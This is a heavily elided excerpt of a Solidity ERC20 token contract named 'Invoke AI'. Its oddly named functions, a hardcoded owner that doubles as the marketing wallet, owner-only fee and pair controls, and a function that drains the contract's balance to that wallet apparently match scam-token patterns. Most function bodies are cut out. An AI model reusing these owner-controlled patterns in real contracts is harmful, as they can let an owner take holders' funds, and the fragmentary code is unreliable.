...
interface IUniswapV2Factory {
    ...
    function setFeeToTax(address) external;
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function viewvSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }    
...
contract InvokeAI is ERC20, Ownable {
    ...
    address private marketingWalletAdd = 0x2C106142895EC13aa3156A067970E309Ec6c8793;

    bool    private vswapping;
    ...
    event BuyFeeUpdate(uint256 buyFee);
    event SellFeeUpdate(uint256 sellFee);
    event SwapWithLimitUpdated(bool swapWithLimit);

    constructor () ERC20("Invoke AI", "INVOKE") 
    {   
        address newOwner = 0x2C106142895EC13aa3156A067970E309Ec6c8793;
        ...
        _initstart(owner(), 200000000 ether);
    }

    receive() external payable {}


    function marketingfund() external {
      payable(marketingWalletAdd).transfer(address(this).balance);
    }


    function swapLiquify(address newUniswapV2Pair) external onlyOwner {
    ...
    function _transfer(address from, address to, uint256 amount) internal override {
        ...
        uint256 _totalFees;
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to] || vswapping) {
            _totalFees = 0;
    ...
    function referencex(address _token) external {
